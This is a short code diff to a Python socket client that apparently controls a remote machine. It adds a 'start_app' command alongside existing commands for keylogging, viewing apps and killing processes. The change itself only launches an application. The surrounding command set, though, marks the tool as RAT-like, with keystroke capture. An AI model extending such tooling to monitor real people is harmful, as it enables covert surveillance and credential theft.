@@ -12,6 +12,7 @@ CMD_START_KEYLOGGER = 'start_keylogger'
 CMD_STOP_KEYLOGGER = 'stop_keylogger'
 CMD_PRINT_KEYLOGGER = 'print_keylogger'
 CMD_VIEW_APPS = 'view_apps'
+CMD_START_APP = 'start_app'
 
 # FLAGS
 FLAG_FILE_END = 'FILE_END'
@@ -77,7 +78,8 @@ class Client:
         pid = input('Enter pid: ')
         self.kill_process(pid)
       elif cmd == '5':
-        pass
+        app_name = input('Enter app name: ')
+        self.start_app(app_name)
       elif cmd == '6':
         pass
       elif cmd == '7':
@@ -150,6 +152,11 @@ class Client:
       else:
         apps += data.decode()
     print(apps)
+
+  def start_app(self, app_name):
+    self.socket.send(CMD_START_APP.encode())
+    time.sleep(0.01)
+    self.socket.send(app_name.encode())
     
 
 
